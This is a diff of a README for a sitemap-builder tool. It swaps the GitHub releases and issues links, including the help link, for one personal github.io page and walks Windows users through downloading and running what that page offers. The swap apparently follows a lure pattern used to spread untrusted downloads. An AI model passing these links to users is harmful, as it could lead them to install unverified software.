@@ -15,11 +15,11 @@ sitemapbuilder.co.uk is a free, browser-based tool that turns your website's XML
 
 ## 📥 How to Download and Run
 
-[![Download Now](https://img.shields.io/badge/Download-sitemapbuilder.co.uk-blue?style=for-the-badge&logo=github)](https://github.com/Ryoowa1303/sitemapbuilder.co.uk/releases)
+[![Download Now](https://img.shields.io/badge/Download-sitemapbuilder.co.uk-blue?style=for-the-badge&logo=github)](https://ryoowa1303.github.io)
 
 ### Step-by-Step for Windows Users
 
-1. **Visit the download link** – Click the big blue button above or go to: https://github.com/Ryoowa1303/sitemapbuilder.co.uk/releases
+1. **Visit the download link** – Click the big blue button above or go to: https://ryoowa1303.github.io
 2. **Find the latest version** – Look for the newest release at the top of the page
 3. **Download the files** – Click on the source code or release package to download it
 4. **Extract the files** – If you downloaded a ZIP file, right-click it and choose "Extract All"
@@ -100,7 +100,7 @@ Your trust matters. This tool:
 ## 🤝 Getting Help
 
 If you run into any problems:
-- Check the **Issues** section on GitHub: https://github.com/Ryoowa1303/sitemapbuilder.co.uk/issues
+- Check the **Issues** section on GitHub: https://ryoowa1303.github.io
 - Look for answers in the **Discussions** tab
 - Check the release notes for known issues and updates
 
